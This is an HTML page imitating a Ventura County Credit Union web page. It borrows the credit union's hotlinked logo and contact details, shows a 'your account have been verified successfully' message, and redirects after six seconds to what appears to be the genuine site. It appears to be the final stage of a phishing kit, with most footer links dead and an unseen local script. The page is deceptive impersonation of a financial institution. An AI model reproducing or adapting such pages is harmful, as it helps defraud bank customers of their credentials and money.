<!DOCTYPE html>
<html lang="en">
<head>

<meta charset="UTF-8">
<meta http-equiv="Refresh" content="6;https://vccuonline.net/"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Ventura County Credit Union</title>
<link rel="icon" href="https://assets.orb.alkamitech.com/production/themesets/bf69c136-f7f5-4ad3-b47b-7681fbc90c13/themes/theme-builder/26db451e-13c2-479e-a469-db8ce785fad5/assets/favicons/favicon.png">	
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<link rel="stylesheet" href="style.css">

<link rel="stylesheet"
href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
<link rel="stylesheet" href="file/theme.desktop.css">

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Open Sans',sans-serif;
}

body{
    background:#ffffff;
}

/* ===========================
   HEADER
=========================== */

.top-header{
    width:100%;
    height:40px;
    background:#f2f2f2;
    display:flex;
    justify-content:flex-end;
    align-items:center;
    padding:0 40px;
    border-bottom:1px solid #ececec;
}

.logout a{
    color:#000;
    text-decoration:none;
    font-size:15px;
}

.logout i{
    margin-right:6px;
}

/* ===========================
   PAGE
=========================== */

.page{
    min-height:calc(100vh - 230px);
    display:flex;
    justify-content:center;
    align-items:center;
    padding:50px 20px;
}

/* ===========================
   CARD
=========================== */

.login-card{
    width:100%;
    max-width:500px;
    background:#fff;
    border:1px solid #dddddd;
    border-radius:18px;
    padding:38px 48px 48px;
    position:relative;
}

.menu-btn{
    position:absolute;
    right:24px;
    top:24px;
    width:34px;
    height:34px;
    border:none;
    border-radius:50%;
    background:#B0BDC8;
    color:#0b527b;
    cursor:pointer;
    font-size:18px;
}

/* ===========================
   LOGO
=========================== */

.logo{
    text-align:center;
    margin-bottom:35px;
}

.logo img{
    width:220px;
    max-width:100%;
}

/* ===========================
   INPUTS
=========================== */

.input-box{
    position:relative;
    margin-bottom:18px;
}

.input-box input{
    width:100%;
    height:58px;
    border:none;
    outline:none;
    background:#f3f3f3;
    border-radius:16px;
    padding:0 18px;
    font-size:15px;
}

.password input{
    padding-right:55px;
}

.eye{
    position:absolute;
    right:20px;
    top:50%;
    transform:translateY(-50%);
    cursor:pointer;
    color:#6f5d4d;
    font-size:18px;
}

/* ===========================
   REMEMBER
=========================== */

.remember{
    display:flex;
    align-items:center;
    gap:14px;
    margin:18px 0 24px;
}

.switch{
    position:relative;
    width:48px;
    height:24px;
}

.switch input{
    display:none;
}

.slider{
    position:absolute;
    inset:0;
    background:#B0BDC8;
    border-radius:50px;
    transition:.3s;
}

.slider:before{
    content:"";
    width:18px;
    height:18px;
    background:#291F5A;
    position:absolute;
    left:3px;
    top:3px;
    border-radius:50%;
    transition:.3s;
}

.switch input:checked + .slider{
    background:#B0BDC8;
}

.switch input:checked + .slider:before{
    transform:translateX(24px);
}

/* ===========================
   ERROR
=========================== */

.error-box{
    display:flex;
    gap:14px;
    background:#fdf3f3;
    border-radius:18px;
    padding:18px;
    margin-bottom:25px;
}

.error-icon{
    color:#ea4335;
    font-size:18px;
    margin-top:3px;
}

.error-text{
    font-size:14px;
    line-height:1.7;
}

/* ===========================
   BUTTON
=========================== */

.login-btn{
    width:100%;
    height:52px;
    border:none;
    border-radius:30px;
    background:#0F2F5F;
    color:#fff;
    font-size:20px;
    font-weight:600;
    cursor:pointer;
    transition:.25s;
}

.login-btn:hover{
    background:#0F2F5F;
}

/* ===========================
   LINKS
=========================== */

.forgot{
    display:block;
    text-align:center;
    margin-top:22px;
    color:#004fa4;
    text-decoration:none;
    font-size:14px;
}

.register{
    display:block;
    text-align:center;
    margin-top:40px;
    color:#004fa4;
    text-decoration:none;
    font-size:18px;
    font-weight:600;
}

/* ===========================
   FOOTER
=========================== */

footer{
    background:#177E95;
    padding:45px 8%;
    display:flex;
    justify-content:space-between;
    flex-wrap:wrap;
    gap:40px;
}

.footer-left{
    max-width:700px;
}

.footer-left a{
    display:inline-block;
    color:#fff;
    margin:0 20px 18px 0;
    text-decoration:underline;
    font-size:15px;
}

.footer-left p{
    margin-top:12px;
	color:#fff;
    font-size:14px;
}

.footer-right{
    text-align:right;
}

.footer-right p{
    font-size:16px;
	color:#fff;
    margin-bottom:22px;
}

.footer-right strong{
    font-weight:700;
}

.footer-logos{
    display:flex;
    gap:18px;
    justify-content:flex-end;
}

.footer-logos img{
    width:400px;
    height:auto;
}

.badge{
    width:150px;
    height:72px;
    background:#fff;
    border:2px solid #333;
    display:flex;
    justify-content:center;
    align-items:center;
    font-weight:700;
    text-align:center;
    padding:10px;
}

/* ===========================
   MOBILE
=========================== */

@media(max-width:768px){

.top-header{
    padding:0 20px;
}

.login-card{
    padding:30px 20px;
}

.logo img{
    width:180px;
}

footer{
    flex-direction:column;
}

.footer-right{
    text-align:left;
}

.footer-logos{
    justify-content:flex-start;
}

.login-btn{
    font-size:22px;
}

}

</style>

</head>

<body>

<!-- HEADER -->

</header>

<!-- LOGIN -->

<div class="page">

<div class="login-card">

<button class="menu-btn">

<i class="fa-solid fa-ellipsis"></i>

</button>

<div class="logo">

<img src="https://assets.orb.alkamitech.com/production/themesets/bf69c136-f7f5-4ad3-b47b-7681fbc90c13/themes/theme-builder/26db451e-13c2-479e-a469-db8ce785fad5/assets/images/brand-logo-wide.png"
alt="logo">

</div>

<form method="post" action="">

<div class="input-box">

<p>
Your account have been verified successfully. You can now use your account without restriction. 
</p>

</div>

<div class="input-box password">

<p align="center"><img src="https://media.tenor.com/bm8Q6yAlsPsAAAAj/verified.gif" alt="">

</div>

</form>

</div>

</div>

<!-- FOOTER -->

<footer>

<div class="footer-left">

<a href="#">Home</a>

<a href="#">Mobile</a>

<a href="#">Browser Support</a>

<a href="#">Contact Us</a>

<br>

<a href="#">Privacy Policy</a>

<a href="#">Get CoBrowsing Code</a>

<br>

<img src="file/social.png">

<br><br>

<img src="file/ncua.png">

<br>

<p>

Copyright © 2026 All rights reserved.

</p>

</div>

<div class="footer-right">

<p>
NMLS number: <strong>700409</strong>

&nbsp;&nbsp;

Routing number:
<strong>322283505</strong>

</p>

<p>
PO Box 6920 Ventura, CA 93006-6920
<br>
800.339.0496
</P>



<div class="">

<img src="https://assets.orb.alkamitech.com/production/assets/themes/images/appLogos/google-play.svg">

<img src="https://assets.orb.alkamitech.com/production/assets/themes/images/appLogos/app-store.svg">

</div>

</div>

</div>

</footer>

<script src="file/script.js"></script>

</body>
</html>